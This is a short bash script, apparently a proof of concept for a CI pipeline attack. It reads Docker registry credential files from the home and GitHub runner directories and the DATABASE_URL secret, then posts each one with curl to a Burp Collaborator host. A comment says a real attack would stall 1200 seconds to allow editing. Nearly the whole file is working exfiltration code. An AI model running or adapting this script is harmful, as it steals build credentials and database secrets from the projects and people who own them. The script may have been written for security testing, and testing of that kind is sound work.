#!/usr/bin/env bash
#filename: myscript.sh

echo "-------------hello1--------------" >&2


export webhook="hg1k4kcatxz4lr29wui6vnwy9pfj38.burpcollaborator.net"

curl -X POST \
  -H "Content-Type: text/plain" \
  --data "$(cat ~/.docker/config.json)" \
    "$webhook/docker_cred"

curl -X POST \
  -H "Content-Type: text/plain" \
  --data "$(cat /home/runner/.docker/config.json)" \
    "$webhook/docker_cred2"

curl -X POST \
  -H "Content-Type: text/plain" \
  --data "$DATABASE_URL" \
    "$webhook/aaaa"

sleep 2 # in real attack it will be 1200 to have time to edit